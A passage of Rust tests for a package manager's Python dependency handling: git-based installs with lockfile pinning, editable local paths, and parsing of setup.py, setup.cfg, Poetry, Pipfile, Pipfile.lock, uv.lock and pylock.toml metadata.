    fs::write(
        repo.join("pyproject.toml"),
        r#"
            [project]
            name = "gitpkg"

            [project.scripts]
            git-vcs-cli = "gitpkg.cli:main"
            "#,
    )
    .unwrap();
    commit_git_repo(&repo);
    let first_commit = git_rev_parse_head(&repo, "gitpkg").unwrap();

    let project = dir.path().join("project");
    fs::create_dir_all(&project).unwrap();
    let repo_url = reqwest::Url::from_directory_path(&repo)
        .unwrap()
        .to_string();
    fs::write(
        project.join("requirements.txt"),
        format!("gitpkg @ git+{repo_url}@HEAD\n"),
    )
    .unwrap();

    install_project(&LinkOptions::new(&project)).unwrap();
    let lock = read_lockfile(project.join("omc.lock")).unwrap();
    assert_eq!(lock.python_vcs.len(), 1);
    assert_eq!(lock.python_vcs[0].resolved_commit, first_commit);

    fs::write(src.join("cli.py"), "def main():\n    print('v2')\n").unwrap();
    assert!(Command::new("git")
        .arg("-C")
        .arg(&repo)
        .arg("add")
        .arg(".")
        .status()
        .unwrap()
        .success());
    assert!(Command::new("git")
        .arg("-C")
        .arg(&repo)
        .arg("-c")
        .arg("user.email=omc@example.invalid")
        .arg("-c")
        .arg("user.name=omc test")
        .arg("commit")
        .arg("--quiet")
        .arg("-m")
        .arg("second")
        .status()
        .unwrap()
        .success());
    assert_ne!(git_rev_parse_head(&repo, "gitpkg").unwrap(), first_commit);
    remove_path_if_exists(&repo).unwrap();
    remove_path_if_exists(&project.join(".omc/python/vcs")).unwrap();

    install_locked_project(&LinkOptions::new(&project)).unwrap();
    let output = Command::new(project.join(".omc/python/bin/git-vcs-cli"))
        .output()
        .unwrap();
    assert!(output.status.success());
    assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "v1");
}

#[test]
fn locked_python_vcs_install_requires_lock_entry() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("requirements.txt"),
        "gitpkg @ git+https://example.invalid/gitpkg.git@main\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("omc.lock"),
        toml::to_string_pretty(&OmcLock::new()).unwrap(),
    )
    .unwrap();

    let error = install_locked_project(&LinkOptions::new(dir.path())).unwrap_err();
    assert!(matches!(error, OmcRegistryError::LockfileOutOfDate(_)));
}

#[test]
fn reads_python_vcs_static_dependencies() {
    let dir = tempfile::tempdir().unwrap();
    let repo = dir.path().join("gitpkg-repo");
    fs::create_dir_all(repo.join("gitpkg")).unwrap();
    fs::write(repo.join("gitpkg").join("__init__.py"), "").unwrap();
    fs::write(
        repo.join("pyproject.toml"),
        r#"
            [project]
            name = "gitpkg"
            dependencies = ["idna==3.7"]
            "#,
    )
    .unwrap();
    commit_git_repo(&repo);

    let repo_url = reqwest::Url::from_directory_path(&repo)
        .unwrap()
        .to_string();
    let vcs = PythonVcsRequirement {
        name: "gitpkg".to_owned(),
        url: repo_url,
        reference: Some("HEAD".to_owned()),
        subdirectory: None,
        extras: BTreeSet::new(),
    };
    let resolved = resolve_python_vcs_requirements(dir.path(), &[vcs], None).unwrap();
    assert!(has_spec(&resolved.requirements.specs, "idna", "==3.7"));
    assert_eq!(resolved.requirements.python_local_paths.len(), 1);
    assert_eq!(resolved.locks.len(), 1);
    assert!(is_git_commit_hash(&resolved.locks[0].resolved_commit));
}

#[test]
fn installs_editable_python_local_paths_preferring_src_layout() {
    let dir = tempfile::tempdir().unwrap();
    let local = dir.path().join("localpkg");
    let src = local.join("src");
    fs::create_dir_all(src.join("localpkg")).unwrap();
    let site_packages = dir.path().join(".omc").join("python").join("site-packages");
    let bin_dir = dir.path().join(".omc").join("python").join("bin");
    fs::create_dir_all(&site_packages).unwrap();
    fs::write(src.join("localpkg").join("__init__.py"), "").unwrap();
    fs::write(
        src.join("localpkg").join("cli.py"),
        "def main():\n    print('local-cli-ok')\n",
    )
    .unwrap();
    fs::write(
        local.join("pyproject.toml"),
        r#"
            [project]
            name = "localpkg"

            [project.scripts]
            local-cli = "localpkg.cli:main"

            [project.gui-scripts]
            local-gui = "localpkg.gui:main"
            "#,
    )
    .unwrap();

    let scripts =
        install_python_local_paths(std::slice::from_ref(&local), &site_packages, &bin_dir).unwrap();
    assert_eq!(scripts, 2);

    let expected = fs::canonicalize(src).unwrap();
    let content =
        fs::read_to_string(dir.path().join(".omc").join("python").join("local-paths")).unwrap();
    assert_eq!(content.trim(), expected.to_string_lossy());
    let script = fs::read_to_string(bin_dir.join("local-cli")).unwrap();
    assert!(script.contains("from localpkg.cli import main"));
    let script = fs::read_to_string(bin_dir.join("local-gui")).unwrap();
    assert!(script.contains("from localpkg.gui import main"));

    let output = Command::new(bin_dir.join("local-cli")).output().unwrap();
    assert!(output.status.success());
    assert_eq!(
        String::from_utf8_lossy(&output.stdout).trim(),
        "local-cli-ok"
    );
}

#[test]
fn local_python_install_extras_resolve_optional_local_dependencies() {
    let dir = tempfile::tempdir().unwrap();
    let project = dir.path().join("project");
    let local = dir.path().join("localpkg");
    let dep = dir.path().join("deppkg");
    fs::create_dir_all(&project).unwrap();
    fs::create_dir_all(local.join("src/localpkg")).unwrap();
    fs::create_dir_all(dep.join("src/deppkg")).unwrap();
    fs::write(
        local.join("pyproject.toml"),
        format!(
            r#"
                [project]
                name = "localpkg"
                version = "0.1.0"

                [project.optional-dependencies]
                dev = ["deppkg @ {}"]
                "#,
            dep.display()
        ),
    )
    .unwrap();
    fs::write(local.join("src/localpkg/__init__.py"), "VALUE = 'local'\n").unwrap();
    fs::write(
        dep.join("pyproject.toml"),
        r#"
            [project]
            name = "deppkg"
            version = "0.1.0"
            "#,
    )
    .unwrap();
    fs::write(dep.join("src/deppkg/__init__.py"), "VALUE = 'dep'\n").unwrap();

    let mut options = LinkOptions::new(&project);
    options
        .python_local_requirements
        .push(PythonLocalRequirement::new(
            local.clone(),
            BTreeSet::from(["dev".to_owned()]),
        ));
    let report = install_project(&options).unwrap();

    let local_paths =
        fs::read_to_string(project.join(".omc").join("python").join("local-paths")).unwrap();
    assert!(local_paths.contains(&local.join("src").to_string_lossy().to_string()));
    assert!(local_paths.contains(&dep.join("src").to_string_lossy().to_string()));
    assert_eq!(report.pypi_packages, 0);
}

#[test]
fn installs_setup_cfg_python_local_entry_points() {
    let dir = tempfile::tempdir().unwrap();
    let local = dir.path().join("setuppkg");
    let src = local.join("src");
    fs::create_dir_all(src.join("setuppkg")).unwrap();
    let site_packages = dir.path().join(".omc").join("python").join("site-packages");
    let bin_dir = dir.path().join(".omc").join("python").join("bin");
    fs::create_dir_all(&site_packages).unwrap();
    fs::write(src.join("setuppkg").join("__init__.py"), "").unwrap();
    fs::write(
        src.join("setuppkg").join("cli.py"),
        "def main():\n    print('setup-cfg-cli-ok')\n",
    )
    .unwrap();
    fs::write(
        local.join("setup.cfg"),
        r#"
            [metadata]
            name = setuppkg

            [options.entry_points]
            console_scripts =
                setup-cli = setuppkg.cli:main
            gui_scripts =
                setup-gui = setuppkg.gui:main
            "#,
    )
    .unwrap();

    let scripts =
        install_python_local_paths(std::slice::from_ref(&local), &site_packages, &bin_dir).unwrap();
    assert_eq!(scripts, 2);

    let script = fs::read_to_string(bin_dir.join("setup-cli")).unwrap();
    assert!(script.contains("from setuppkg.cli import main"));
    let script = fs::read_to_string(bin_dir.join("setup-gui")).unwrap();
    assert!(script.contains("from setuppkg.gui import main"));

    let output = Command::new(bin_dir.join("setup-cli")).output().unwrap();
    assert!(output.status.success());
    assert_eq!(
        String::from_utf8_lossy(&output.stdout).trim(),
        "setup-cfg-cli-ok"
    );
}

#[test]
fn installs_setup_py_python_local_entry_points() {
    let dir = tempfile::tempdir().unwrap();
    let local = dir.path().join("setuppkg");
    let src = local.join("src");
    fs::create_dir_all(src.join("setuppkg")).unwrap();
    let site_packages = dir.path().join(".omc").join("python").join("site-packages");
    let bin_dir = dir.path().join(".omc").join("python").join("bin");
    fs::create_dir_all(&site_packages).unwrap();
    fs::write(src.join("setuppkg").join("__init__.py"), "").unwrap();
    fs::write(
        src.join("setuppkg").join("cli.py"),
        "def main():\n    print('setup-py-cli-ok')\n",
    )
    .unwrap();
    fs::write(
        local.join("setup.py"),
        r#"
            from setuptools import setup

            NOTE = "entry_points={'console_scripts': ['ignored-string = ignored:main']}"
            # entry_points={"console_scripts": ["ignored-comment = ignored:main"]}

            setup(
                name="setuppkg",
                entry_points={
                    "console_scripts": [
                        "setup-cli = setuppkg.cli:main",
                    ],
                    "gui_scripts": ["setup-gui = setuppkg.gui:main"],
                    "pytest11": ["ignored = ignored:plugin"],
                },
            )
            "#,
    )
    .unwrap();

    let scripts =
        install_python_local_paths(std::slice::from_ref(&local), &site_packages, &bin_dir).unwrap();
    assert_eq!(scripts, 2);

    let script = fs::read_to_string(bin_dir.join("setup-cli")).unwrap();
    assert!(script.contains("from setuppkg.cli import main"));
    let script = fs::read_to_string(bin_dir.join("setup-gui")).unwrap();
    assert!(script.contains("from setuppkg.gui import main"));
    assert!(!bin_dir.join("ignored").exists());
    assert!(!bin_dir.join("ignored-string").exists());
    assert!(!bin_dir.join("ignored-comment").exists());

    let output = Command::new(bin_dir.join("setup-cli")).output().unwrap();
    assert!(output.status.success());
    assert_eq!(
        String::from_utf8_lossy(&output.stdout).trim(),
        "setup-py-cli-ok"
    );
}

#[test]
fn installs_root_python_project_as_local_path() {
    let dir = tempfile::tempdir().unwrap();
    let src = dir.path().join("src");
    fs::create_dir_all(src.join("rootpkg")).unwrap();
    fs::write(
        src.join("rootpkg").join("__init__.py"),
        "VALUE = 'root-ok'\n",
    )
    .unwrap();
    fs::write(
        src.join("rootpkg").join("cli.py"),
        "from rootpkg import VALUE\n\ndef main():\n    print(VALUE)\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("pyproject.toml"),
        r#"
            [project]
            name = "rootpkg"
            version = "0.1.0"

            [project.scripts]
            root-cli = "rootpkg.cli:main"
            "#,
    )
    .unwrap();

    let report = install_project(&LinkOptions::new(dir.path())).unwrap();
    assert_eq!(report.python_scripts, 1);

    let expected = fs::canonicalize(src).unwrap();
    let content =
        fs::read_to_string(dir.path().join(".omc").join("python").join("local-paths")).unwrap();
    assert_eq!(content.trim(), expected.to_string_lossy());

    let output = Command::new(
        dir.path()
            .join(".omc")
            .join("python")
            .join("bin")
            .join("root-cli"),
    )
    .output()
    .unwrap();
    assert!(output.status.success());
    assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "root-ok");
}

#[test]
fn locked_install_restores_root_python_project_scripts() {
    let dir = tempfile::tempdir().unwrap();
    let src = dir.path().join("src");
    fs::create_dir_all(src.join("rootpkg")).unwrap();
    fs::write(
        src.join("rootpkg").join("__init__.py"),
        "VALUE = 'locked-root-ok'\n",
    )
    .unwrap();
    fs::write(
        src.join("rootpkg").join("cli.py"),
        "from rootpkg import VALUE\n\ndef main():\n    print(VALUE)\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("pyproject.toml"),
        r#"
            [project]
            name = "rootpkg"
            version = "0.1.0"

            [project.scripts]
            root-cli = "rootpkg.cli:main"
            "#,
    )
    .unwrap();
    fs::write(
        dir.path().join("omc.lock"),
        toml::to_string_pretty(&OmcLock::new()).unwrap(),
    )
    .unwrap();

    let report = install_locked_packages(dir.path()).unwrap();
    assert_eq!(report.python_scripts, 1);

    let expected = fs::canonicalize(src).unwrap();
    let content =
        fs::read_to_string(dir.path().join(".omc").join("python").join("local-paths")).unwrap();
    assert_eq!(content.trim(), expected.to_string_lossy());

    let output = Command::new(
        dir.path()
            .join(".omc")
            .join("python")
            .join("bin")
            .join("root-cli"),
    )
    .output()
    .unwrap();
    assert!(output.status.success());
    assert_eq!(
        String::from_utf8_lossy(&output.stdout).trim(),
        "locked-root-ok"
    );
}

#[test]
fn discovers_root_setup_metadata_as_local_path() {
    let setup_cfg_dir = tempfile::tempdir().unwrap();
    fs::write(
        setup_cfg_dir.path().join("setup.cfg"),
        r#"
            [metadata]
            name = setup-cfg-root
            "#,
    )
    .unwrap();
    let discovered = discover_project_requirements(setup_cfg_dir.path()).unwrap();
    assert_eq!(
        discovered.python_local_paths,
        vec![setup_cfg_dir.path().to_path_buf()]
    );

    let setup_py_dir = tempfile::tempdir().unwrap();
    fs::write(
        setup_py_dir.path().join("setup.py"),
        r#"from setuptools import setup
setup(name="setup-py-root")
"#,
    )
    .unwrap();
    let discovered = discover_project_requirements(setup_py_dir.path()).unwrap();
    assert_eq!(
        discovered.python_local_paths,
        vec![setup_py_dir.path().to_path_buf()]
    );
}

#[test]
fn parses_setup_py_entry_points_ini_string() {
    let entries = parse_setup_py_entry_points(
        r#"
            from setuptools import setup

            setup(
                entry_points="""
                [console_scripts]
                setup-cli = setuppkg.cli:main

                [gui_scripts]
                setup-gui = setuppkg.gui:main
                """,
            )
            "#,
    );

    assert_eq!(
        entries,
        vec![
            PythonEntryPoint {
                name: "setup-cli".to_owned(),
                module: "setuppkg.cli".to_owned(),
                function: "main".to_owned(),
            },
            PythonEntryPoint {
                name: "setup-gui".to_owned(),
                module: "setuppkg.gui".to_owned(),
                function: "main".to_owned(),
            }
        ]
    );
}

#[test]
fn installs_poetry_table_python_local_entry_points() {
    let dir = tempfile::tempdir().unwrap();
    let local = dir.path().join("poetrypkg");
    let src = local.join("src");
    fs::create_dir_all(src.join("poetrypkg")).unwrap();
    let site_packages = dir.path().join(".omc").join("python").join("site-packages");
    let bin_dir = dir.path().join(".omc").join("python").join("bin");
    fs::create_dir_all(&site_packages).unwrap();
    fs::write(src.join("poetrypkg").join("__init__.py"), "").unwrap();
    fs::write(
        src.join("poetrypkg").join("cli.py"),
        "def main():\n    print('poetry-table-cli-ok')\n",
    )
    .unwrap();
    fs::write(
        local.join("pyproject.toml"),
        r#"
            [tool.poetry]
            name = "poetrypkg"
            version = "0.1.0"

            [tool.poetry.scripts]
            poetry-cli = { callable = "poetrypkg.cli:main" }
            ignored-file = { reference = "scripts/run.py", type = "file" }
            "#,
    )
    .unwrap();

    let scripts =
        install_python_local_paths(std::slice::from_ref(&local), &site_packages, &bin_dir).unwrap();
    assert_eq!(scripts, 1);

    let script = fs::read_to_string(bin_dir.join("poetry-cli")).unwrap();
    assert!(script.contains("from poetrypkg.cli import main"));
    assert!(!bin_dir.join("ignored-file").exists());

    let output = Command::new(bin_dir.join("poetry-cli")).output().unwrap();
    assert!(output.status.success());
    assert_eq!(
        String::from_utf8_lossy(&output.stdout).trim(),
        "poetry-table-cli-ok"
    );
}

#[test]
fn reads_pipfile_specs_sources_paths_and_dev_packages() {
    let dir = tempfile::tempdir().unwrap();
    let pipfile = dir.path().join("Pipfile");
    let local_pkg = dir.path().join("localpkg");
    let dev_local = dir.path().join("devlocal");
    let wheel = dir
        .path()
        .join("wheels")
        .join("local_idna-3.7-py3-none-any.whl");
    let sdist = dir.path().join("wheels").join("local_source-1.0.0.tar.gz");
    fs::create_dir_all(&local_pkg).unwrap();
    fs::create_dir_all(&dev_local).unwrap();
    fs::create_dir_all(wheel.parent().unwrap()).unwrap();
    fs::write(&wheel, b"not a real wheel").unwrap();
    fs::write(&sdist, b"not a real sdist").unwrap();
    fs::write(
            &pipfile,
            r#"
            [[source]]
            name = "pypi"
            url = "https://pypi.org/simple"
            verify_ssl = true

            [[source]]
            name = "private"
            url = "https://packages.example/simple"
            verify_ssl = true

            [[source]]
            name = "duplicate"
            url = "https://packages.example/simple/"
            verify_ssl = true

            [packages]
            requests = { version = "==2.32.3", extras = ["socks"], markers = "python_version >= '3'", index = "private" }
            old-python-only = { version = "==0.1.0", markers = "python_version < '2'" }
            localpkg = { path = "localpkg", editable = true }
            local-idna = { file = "wheels/local_idna-3.7-py3-none-any.whl" }
            local-source = { file = "wheels/local_source-1.0.0.tar.gz" }
            any-version = "*"

            [dev-packages]
            pytest = "==8.2.0"
            devlocal = { path = "devlocal" }
            "#,
        )
        .unwrap();

    let production = read_pipfile_requirements(&pipfile, false).unwrap();
    let requests = production
        .specs
        .iter()
        .find(|spec| spec.name == "requests")
        .unwrap();
    assert_eq!(requests.version.as_deref(), Some("==2.32.3"));
    assert!(requests.extras.contains("socks"));
    let any_version = production
        .specs
        .iter()
        .find(|spec| spec.name == "any-version")
        .unwrap();
    assert_eq!(any_version.version.as_deref(), None);
    let local = production
        .specs
        .iter()
        .find(|spec| spec.name == "local-idna")
        .unwrap();
    assert!(local.direct_url.as_deref().unwrap().starts_with("file://"));
    assert!(local
        .direct_url
        .as_deref()
        .unwrap()
        .ends_with("local_idna-3.7-py3-none-any.whl"));
    let local_source = production
        .specs
        .iter()
        .find(|spec| spec.name == "local-source")
        .unwrap();
    assert!(local_source
        .direct_url
        .as_deref()
        .unwrap()
        .ends_with("local_source-1.0.0.tar.gz"));
    assert_eq!(
        production.pypi_index_url.as_deref(),
        Some("https://pypi.org/simple/")
    );
    assert_eq!(
        production.pypi_extra_index_urls,
        vec!["https://packages.example/simple/".to_owned()]
    );
    assert_eq!(production.python_local_paths, vec![local_pkg.clone()]);
    assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
    assert!(!production
        .specs
        .iter()
        .any(|spec| spec.name == "old-python-only"));

    let dev = read_pipfile_requirements(&pipfile, true).unwrap();
    assert!(dev
        .specs
        .iter()
        .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("==8.2.0")));
    assert_eq!(dev.python_local_paths, vec![local_pkg, dev_local]);
}

#[test]
fn discovers_pipfile_requirements_without_lock() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("localpkg")).unwrap();
    fs::write(
        dir.path().join("Pipfile"),
        r#"
            [[source]]
            name = "pypi"
            url = "https://pypi.org/simple"
            verify_ssl = true

            [packages]
            idna = "==3.7"
            localpkg = { path = "localpkg" }

            [dev-packages]
            pytest = "==8.2.0"
            "#,
    )
    .unwrap();

    let production =
        discover_project_requirements_with_options(dir.path(), &BTreeSet::new(), false).unwrap();
    assert!(production
        .specs
        .iter()
        .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("==3.7")));
    assert_eq!(
        production.python_local_paths,
        vec![dir.path().join("localpkg")]
    );
    assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));

    let dev = discover_project_requirements(dir.path()).unwrap();
    assert!(dev
        .specs
        .iter()
        .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("==8.2.0")));
}

#[test]
fn pipfile_lock_takes_precedence_over_pipfile() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("Pipfile"),
        r#"
            [packages]
            flask = "==3.0.0"
            "#,
    )
    .unwrap();
    fs::write(
        dir.path().join("Pipfile.lock"),
        r#"{
                "_meta": {},
                "default": {
                    "idna": { "version": "==3.7" }
                }
            }"#,
    )
    .unwrap();

    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert!(discovered
        .specs
        .iter()
        .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("3.7")));
    assert!(!discovered.specs.iter().any(|spec| spec.name == "flask"));
}

#[test]
fn reads_pipfile_vcs_dependencies_and_rejects_missing_paths() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
            dir.path().join("Pipfile"),
            r#"
            [packages]
            git-package = { git = "https://example.invalid/pkg.git", ref = "abc123", extras = ["cli"], subdirectory = "pkg" }
            "#,
        )
        .unwrap();
    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert_eq!(discovered.python_vcs_requirements.len(), 1);
    let vcs = &discovered.python_vcs_requirements[0];
    assert_eq!(vcs.name, "git-package");
    assert_eq!(vcs.url, "https://example.invalid/pkg.git");
    assert_eq!(vcs.reference.as_deref(), Some("abc123"));
    assert_eq!(vcs.subdirectory.as_deref(), Some(Path::new("pkg")));
    assert_eq!(vcs.extras, BTreeSet::from(["cli".to_owned()]));

    fs::write(
        dir.path().join("Pipfile"),
        r#"
            [packages]
            local-package = { path = "missing" }
            "#,
    )
    .unwrap();
    let error = discover_project_requirements(dir.path()).unwrap_err();
    assert!(error.to_string().contains("Pipfile local path"));
}

#[test]
fn reads_pipfile_lock_specs_constraints_and_hashes() {
    let dir = tempfile::tempdir().unwrap();
    let pipfile_lock = dir.path().join("Pipfile.lock");
    let editable_local = dir.path().join("editable-local");
    let dev_local = dir.path().join("dev-local");
    fs::create_dir_all(&editable_local).unwrap();
    fs::create_dir_all(&dev_local).unwrap();
    let hash = "a".repeat(64);
    fs::write(
        &pipfile_lock,
        format!(
            r#"{{
                    "_meta": {{
                        "sources": [
                            {{
                                "name": "pypi",
                                "url": "https://pypi.org/simple",
                                "verify_ssl": true
                            }},
                            {{
                                "name": "private",
                                "url": "https://packages.example/simple",
                                "verify_ssl": true
                            }},
                            {{
                                "name": "duplicate",
                                "url": "https://packages.example/simple/",
                                "verify_ssl": true
                            }}
                        ]
                    }},
                    "default": {{
                        "Requests": {{
                            "version": "==2.32.3",
                            "hashes": ["sha256:{hash}"],
                            "extras": ["socks"],
                            "markers": "python_version >= '3'"
                        }},
                        "old-python-only": {{
                            "version": "==0.1.0",
                            "markers": "python_version < '2'"
                        }},
                        "editable-local": {{
                            "path": "."
                        }},
                        "local-dir": {{
                            "path": "editable-local"
                        }},
                        "git-locked": {{
                            "git": "https://example.invalid/git-locked.git",
                            "ref": "def456",
                            "extras": ["cli"],
                            "subdirectory": "pkg"
                        }}
                    }},
                    "develop": {{
                        "pytest": {{
                            "version": "==8.2.0"
                        }},
                        "dev-local": {{
                            "path": "dev-local"
                        }}
                    }}
                }}"#
        ),
    )
    .unwrap();

    let production = read_pipfile_lock_requirements(&pipfile_lock, false).unwrap();
    let requests = production
        .specs
        .iter()
        .find(|spec| spec.name == "requests")
        .unwrap();
    assert_eq!(requests.version.as_deref(), Some("2.32.3"));
    assert!(requests.extras.contains("socks"));
    assert_eq!(
        production
            .constraints
            .get("pypi:requests")
            .map(String::as_str),
        Some("2.32.3")
    );
    assert_eq!(
        production
            .hashes
            .get("pypi:requests")
            .and_then(|hashes| hashes.iter().next())
            .map(String::as_str),
        Some(hash.as_str())
    );
    assert_eq!(
        production.pypi_index_url.as_deref(),
        Some("https://pypi.org/simple/")
    );
    assert_eq!(
        production.pypi_extra_index_urls,
        vec!["https://packages.example/simple/".to_owned()]
    );
    assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
    assert!(!production
        .specs
        .iter()
        .any(|spec| spec.name == "old-python-only"));
    assert!(!production
        .specs
        .iter()
        .any(|spec| spec.name == "editable-local"));
    assert_eq!(
        production.python_local_paths,
        vec![dir.path().join("."), editable_local.clone()]
    );
    assert_eq!(production.python_vcs_requirements.len(), 1);
    let vcs = &production.python_vcs_requirements[0];
    assert_eq!(vcs.name, "git-locked");
    assert_eq!(vcs.url, "https://example.invalid/git-locked.git");
    assert_eq!(vcs.reference.as_deref(), Some("def456"));
    assert_eq!(vcs.subdirectory.as_deref(), Some(Path::new("pkg")));
    assert_eq!(vcs.extras, BTreeSet::from(["cli".to_owned()]));

    let dev = read_pipfile_lock_requirements(&pipfile_lock, true).unwrap();
    assert!(dev
        .specs
        .iter()
        .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("8.2.0")));
    assert_eq!(
        dev.pypi_index_url.as_deref(),
        Some("https://pypi.org/simple/")
    );
    assert_eq!(
        dev.pypi_extra_index_urls,
        vec!["https://packages.example/simple/".to_owned()]
    );
    assert_eq!(
        dev.python_local_paths,
        vec![dir.path().join("."), editable_local, dev_local]
    );
}

#[test]
fn discovers_pipfile_lock_requirements() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("localpkg")).unwrap();
    fs::write(
            dir.path().join("Pipfile.lock"),
            r#"{
                "_meta": {
                    "sources": [
                        { "name": "pypi", "url": "https://pypi.org/simple", "verify_ssl": true },
                        { "name": "internal", "url": "https://internal.example/simple", "verify_ssl": true }
                    ]
                },
                "default": {
                    "idna": { "version": "==3.7" },
                    "localpkg": { "path": "localpkg" }
                },
                "develop": {
                    "pytest": { "version": "==8.2.0" }
                }
            }"#,
        )
        .unwrap();

    let production =
        discover_project_requirements_with_options(dir.path(), &BTreeSet::new(), false).unwrap();
    assert!(production
        .specs
        .iter()
        .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("3.7")));
    assert_eq!(
        production.python_local_paths,
        vec![dir.path().join("localpkg")]
    );
    assert_eq!(
        production.pypi_index_url.as_deref(),
        Some("https://pypi.org/simple/")
    );
    assert_eq!(
        production.pypi_extra_index_urls,
        vec!["https://internal.example/simple/".to_owned()]
    );
    assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));

    let dev = discover_project_requirements(dir.path()).unwrap();
    assert!(dev
        .specs
        .iter()
        .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("8.2.0")));
}

#[test]
fn rejects_missing_pipfile_lock_local_paths() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("Pipfile.lock"),
        r#"{
                "_meta": {},
                "default": {
                    "local": { "path": "missing" }
                }
            }"#,
    )
    .unwrap();

    let error = discover_project_requirements(dir.path()).unwrap_err();
    assert!(error.to_string().contains("Pipfile.lock local path"));
}

#[test]
fn reads_uv_lock_specs_constraints_and_hashes() {
    let dir = tempfile::tempdir().unwrap();
    let uv_lock = dir.path().join("uv.lock");
    let local_pkg = dir.path().join("vendor/localpkg");
    let dev_local = dir.path().join("vendor/devlocal");
    fs::create_dir_all(&local_pkg).unwrap();
    fs::create_dir_all(&dev_local).unwrap();
    let idna_sdist = "a".repeat(64);
    let idna_wheel = "b".repeat(64);
    let requests_wheel = "c".repeat(64);
    fs::write(
            &uv_lock,
            format!(
                r#"version = 1
revision = 3
requires-python = ">=3.11"

[[package]]
name = "idna"
version = "3.7"
source = {{ registry = "https://pypi.org/simple" }}
sdist = {{ url = "https://files.example/idna-3.7.tar.gz", hash = "sha256:{idna_sdist}" }}
wheels = [
  {{ url = "https://files.example/idna-3.7-py3-none-any.whl", hash = "sha256:{idna_wheel}" }},
]

[[package]]
name = "requests"
version = "2.32.3"
source = {{ registry = "https://pypi.org/simple" }}
wheels = [
  {{ url = "https://files.example/requests-2.32.3-py3-none-any.whl", hash = "sha256:{requests_wheel}" }},
]

[[package]]
name = "localpkg"
version = "0.1.0"
source = {{ editable = "vendor/localpkg" }}

[[package]]
name = "devlocal"
version = "0.1.0"
source = {{ directory = "vendor/devlocal" }}

[[package]]
name = "omc-uv-demo"
version = "0.1.0"
source = {{ virtual = "." }}

[package.metadata]
requires-dist = [
  {{ name = "requests", extras = ["socks"], specifier = "==2.32.3" }},
  {{ name = "localpkg", editable = "vendor/localpkg" }},
  {{ name = "old-python-only", specifier = "==0.1.0", marker = "python_version < '2'" }},
]

[package.metadata.requires-dev]
dev = [
  {{ name = "pytest", specifier = "==8.2.0" }},
  {{ name = "devlocal" }},
]
"#
            ),
        )
        .unwrap();

    let production = read_uv_lock_requirements(&uv_lock, false).unwrap();
    let requests = production
        .specs
        .iter()
        .find(|spec| spec.name == "requests")
        .unwrap();
    assert_eq!(requests.version.as_deref(), Some("==2.32.3"));
    assert!(requests.extras.contains("socks"));
    assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
    assert!(!production
        .specs
        .iter()
        .any(|spec| spec.name == "old-python-only"));
    assert_eq!(production.python_local_paths, vec![local_pkg.clone()]);
    assert_eq!(
        production.constraints.get("pypi:idna").map(String::as_str),
        Some("3.7")
    );
    assert_eq!(
        production
            .constraints
            .get("pypi:requests")
            .map(String::as_str),
        Some("2.32.3")
    );
    assert_eq!(
        production.hashes.get("pypi:idna").cloned().unwrap(),
        BTreeSet::from([idna_sdist, idna_wheel])
    );
    assert_eq!(
        production
            .hashes
            .get("pypi:requests")
            .and_then(|hashes| hashes.iter().next())
            .map(String::as_str),
        Some(requests_wheel.as_str())
    );

    let dev = read_uv_lock_requirements(&uv_lock, true).unwrap();
    assert!(dev
        .specs
        .iter()
        .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("==8.2.0")));
    assert_eq!(dev.python_local_paths, vec![local_pkg, dev_local]);
}

#[test]
fn discovers_uv_lock_requirements() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("vendor/localpkg")).unwrap();
    fs::write(
            dir.path().join("uv.lock"),
            r#"version = 1
revision = 3
requires-python = ">=3.11"

[[package]]
name = "idna"
version = "3.7"
source = { registry = "https://pypi.org/simple" }
wheels = [
  { url = "https://files.example/idna-3.7-py3-none-any.whl", hash = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" },
]

[[package]]
name = "localpkg"
version = "0.1.0"
source = { directory = "vendor/localpkg" }

[[package]]
name = "omc-uv-demo"
version = "0.1.0"
source = { virtual = "." }

[package.metadata]
requires-dist = [
  { name = "idna", specifier = "==3.7" },
  { name = "localpkg" },
]
"#,
        )
        .unwrap();

    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert!(discovered
        .specs
        .iter()
        .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("==3.7")));
    assert_eq!(
        discovered.constraints.get("pypi:idna").map(String::as_str),
        Some("3.7")
    );
    assert_eq!(
        discovered.python_local_paths,
        vec![dir.path().join("vendor/localpkg")]
    );
    assert_eq!(
        discovered
            .hashes
            .get("pypi:idna")
            .and_then(|hashes| hashes.iter().next())
            .map(String::as_str),
        Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    );
}

#[test]
fn reads_pylock_specs_constraints_and_hashes() {
    let dir = tempfile::tempdir().unwrap();
    let pylock = dir.path().join("pylock.toml");
    let sdist = "a".repeat(64);
    let wheel = "b".repeat(64);
    fs::write(
            &pylock,
            format!(
                r#"lock-version = "1.0"
created-by = "test"
requires-python = ">=3.11"

[[packages]]
name = "idna"
version = "3.7"
index = "https://pypi.org/simple"
